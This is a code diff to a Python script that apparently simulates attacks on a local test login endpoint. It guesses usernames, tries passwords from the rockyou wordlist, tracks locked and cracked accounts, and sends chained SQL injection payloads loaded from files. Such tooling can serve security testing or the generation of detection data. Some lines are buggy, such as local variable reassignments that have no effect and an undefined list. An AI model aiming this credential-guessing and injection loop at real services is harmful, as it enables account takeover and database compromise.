@@ -18,8 +18,8 @@ sys.path.insert(1, os.path.join(sys.path[0], ".."))
 import orjson
 import requests
 from api.drivers import read_random_lines
-from api.drivers.creds import generate_passwords
 from api.drivers.creds import generate_usernames
+from api.drivers.creds import generate_passwords
 from orso.tools import random_string
 
 sys.path.insert(1, os.path.join(sys.path[0], "../hakatomi.com"))
@@ -50,7 +50,9 @@ class User:
 
 
 HAKATOMI_URL: str = "http://localhost:8080/v1/authenticate"
-DWELL: int = 0.1
+DWELL: float = 0.2
+INJECTION_PROBABILITY: float = 0.05
+FIND_USER_PROBABILITY: float = 0.8
 
 unlocked_users: int = 0
 users = {}
@@ -61,6 +63,11 @@ potential_sql_injections = []
 def randomly_select_user(statuses: List[UserStatus]) -> User:
     return random.choice([v for k, v in users.items() if v.status in statuses] + [None])
 
+def user_stats() -> tuple:
+    c = {}
+    for s in [v.status for k, v in users.items()]:
+        c[s.name] = sum(1 for k, v in users.items() if v.status == s)
+    return list(c.items())
 
 def choose_random_username() -> str:
     if not hasattr(choose_random_username, "cache") or not choose_random_username.cache:
@@ -69,10 +76,18 @@ def choose_random_username() -> str:
         return random_string(8)
     return choose_random_username.cache.pop()
 
+def choose_random_password() -> str:
+    if not hasattr(choose_random_password, "cache") or not choose_random_password.cache:
+        choose_random_password.cache = read_random_lines("assets/rockyou.txt", 500)
+    return choose_random_password.cache.pop()
 
 def randomly_select_sql_injection() -> str:
     if potential_sql_injections:
         return potential_sql_injections.pop()
+
+    DWELL = 0.0
+    INJECTION_PROBABILITY = 0.25
+    return random.choice(sql_injections) + ";\n" + random.choice(secondary_sql_injections) + " --"
 
 
 def issue_request(user: User):
@@ -84,11 +99,10 @@ def issue_request(user: User):
         user.status = UserStatus.locked
     elif attempt.text == '"password"':
         user.status = UserStatus.active
+    elif attempt.text == '"okay"':
+        user.status = UserStatus.cracked
     elif attempt.status_code == 500:
         pass
-    else:
-        print(attempt.text)
-        quit()
 
     return attempt.status_code, attempt.text
 
@@ -96,18 +110,24 @@ def issue_request(user: User):
 if __name__ == "__main__":
 
     # get the sql injections from the attack file
-    potential_sql_injections = read_random_lines("assets/sql_injection.txt")
+    potential_sql_injections = read_random_lines("assets/sql_injection.txt", 500)
+    secondary_sql_injections = read_random_lines("assets/secondary_sql.txt", 500)
 
+    loops = 0
     while True:
+        loops += 1
+        if loops % 10 == 0:
+            print(user_stats(), loops)
         time.sleep(DWELL)
-        if random.random() < 0.5:
-            # 50% of the time, guess a new username
+        if random.random() < FIND_USER_PROBABILITY:
+            # guess a new username
             username = choose_random_username()
             cycles = 0
             while username in users:
                 cycles += 1
                 if cycles > 10:
                     print("I may have run out of usernames to guess")
+                    FIND_USER_PROBABILITY -= 0.05
                     username = None
                     break
                 username = choose_random_username()
@@ -117,14 +137,19 @@ if __name__ == "__main__":
                 print(f"[{len(users)}] Trying {user.username}, not even sure they exist")
                 issue_request(user)
 
-        if random.random() < 0.50:
-            # 50% of the time, attempt a new password user
+        if random.random() < 0.25:
+            # try a user we know exists
             user = randomly_select_user([UserStatus.unknown, UserStatus.active, UserStatus.new])
             if user:
-                print(
-                    f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}."
-                )
-                issue_request(user)
+                user.password = choose_random_password()
+                if user:
+                    print(
+                        f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}."
+                    )
+                    code, text = issue_request(user)
+                    if text != '"okay"':
+                        user.password = None
+                    users[user.username] = user
 
         if (unlocked_users < 3 and random.random() < 0.10) or (unlocked_users >= 3):
             # 10% of the time, attempt new password for a already locked account
@@ -136,18 +161,20 @@ if __name__ == "__main__":
                     f"[{len(users)}] Trying {user.username}, who last time I checked was {user.status}."
                 )
                 status, message = issue_request(user)
-                if message == "locked":
+                if message == "'locked'":
                     unlocked_users = 0
                 else:
+                    users[user.username] = user
+                    print(f"{user.username} was unlocked")
                     unlocked_users += 1
 
-        if random.random() < 0.10:
-            # 10% of the time, attempt a SQL injection
+        if random.random() < INJECTION_PROBABILITY:
+            # 2% of the time, attempt a SQL injection
             payload = randomly_select_sql_injection()
             if payload:
                 print("Trying SQL injection - ", payload)
                 user = User(username=payload)
                 status, message = issue_request(user)
-                if status == 500:
+                if status != 500:
                     print("WORKED", status, message)
-                pass
+                    sql_injections.append(payload)
